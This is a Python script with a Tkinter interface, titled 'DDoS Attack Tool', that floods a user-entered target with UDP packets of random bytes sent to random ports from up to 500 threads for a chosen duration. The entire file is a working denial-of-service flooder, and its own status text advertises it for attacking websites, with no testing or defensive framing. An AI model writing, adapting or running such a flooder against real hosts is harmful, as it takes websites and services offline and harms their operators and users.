import socket
import time
import random
import threading
import sys
import tkinter as tk
from tkinter import messagebox, ttk

root = tk.Tk()

# ==== Colors ====
qxp = '#4A4A4A'
xtc = '#A4A4A4'
zkn = '#00f000'
m1c = '#00ffff'
bgc = '#222222'
dbg = '#000000'
fgc = '#111111'

root.tk_setPalette(background=bgc, foreground=m1c, activeBackground=fgc,
                   activeForeground=bgc, highlightColor=m1c, highlightBackground=m1c)

stop_flag = threading.Event()  # Event to signal stopping the attack

def Attack():
    try:
        Bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < Timeout and not stop_flag.is_set():  # Check stop_flag before each iteration
            dport = random.randint(22, 55500)
            sock.sendto(Bytes * random.randint(5, 22), (Target.get(), dport))
    except Exception as Error:
        ErrorListbox.insert(tk.END, str(Error))

def start_attack():
    global Timeout
    try:
        target = Target.get()
        threads = int(Threads.get())
        timer = float(Timer.get())

        Timeout = time.time() + timer

        if threads <= 0:
            messagebox.showwarning("Invalid Input", "Threads should be greater than 0.")
            return

        print('\n[+] Starting Attack....')
        ErrorListbox.insert(tk.END, str('\n[+] Starting Attack....'))
        
        # Clear stop_flag before starting the attack
        stop_flag.clear()

        for _ in range(0, threads):
            threading.Thread(target=Attack).start()

    except ValueError:
        messagebox.showerror("Invalid Input", "Please enter valid values for Threads and Timer.")

def stop_attack():
    stop_flag.set()  # Set the stop_flag to signal stopping the attack
    print('\n[+] Stopping Attack....')
    ErrorListbox.insert(tk.END, str('\n[+] Stopping Attack....'))

def clear_entry():
    Target.delete(0, tk.END)
    ErrorListbox.delete(0, tk.END)


root.title("DDoS Attack Tool")

frame = tk.Frame(root, bg=bgc)
frame.pack(padx=20, pady=20)

tk.Label(frame, text="Target:", bg=bgc, fg=m1c).grid(row=0, column=0, padx=5, pady=5)
Target = tk.Entry(frame, width=50, bg='#474747', fg=zkn)
Target.grid(row=0, column=1, padx=5, pady=5)

tk.Label(frame, text="Threads:", bg=bgc, fg=m1c).grid(row=1, column=0, padx=5, pady=5)
Threads = ttk.Combobox(frame, values=[str(i) for i in range(1, 501)], width=5)
Threads.grid(row=1, column=1, padx=5, pady=5)
Threads.current(0)

tk.Label(frame, text="Timer:", bg=bgc, fg=m1c).grid(row=2, column=0, padx=5, pady=5)
Timer = ttk.Combobox(frame, values=["1", "2", "3", "4", "5"], width=5)
Timer.grid(row=2, column=1, padx=5, pady=5)
Timer.current(0)

frame = tk.Frame(root, bg=bgc)

start_button = tk.Button(frame, text="Start Attack", command=start_attack, bg=qxp, fg='#00FF00')
start_button.grid(row=3, column=1, padx=2, pady=10)  # Adjusted position
# start_button.place(x=100, y=100)

stop_button = tk.Button(frame, text="Stop Attack", command=stop_attack, bg=qxp, fg='#FF0000')
stop_button.grid(row=3, column=2, padx=2, pady=10)
stop_button.place(x=220, y=10)

refresh_button = tk.Button(frame, text="Refresh", command=clear_entry, bg=qxp, fg=m1c)
refresh_button.grid(row=3, column=2, padx=2, pady=10)
# refresh_button.place(x=110, y=100)
frame.pack(padx=10, pady=10)

ErrorListbox = tk.Listbox(frame, bg=xtc, fg=fgc)
ErrorListbox.grid(row=4, columnspan=3, padx=5, pady=5)
ErrorListbox.config(width=68, height=14)


# Adding status bar at the bottom
status_bar = tk.Label(root, text="#################################################", fg='#A9A9A9', bd=2)
status_bar.pack(side=tk.BOTTOM, fill=tk.X)
status_message = tk.Label(root, text='DDoS Attack Tool', fg='#A9A9A9', bd=2)
status_message.pack(side=tk.BOTTOM, fill=tk.X)
status_desc = tk.Label(root, text="Utility can be used to execute DDoS attacks on various websites", fg='#A9A9A9', bd=2)
status_desc.pack(side=tk.BOTTOM, fill=tk.X)
status_separator = tk.Label(root, text="#################################################", fg='#A9A9A9', bd=2)
status_separator.pack(side=tk.BOTTOM, fill=tk.X)

root.mainloop()
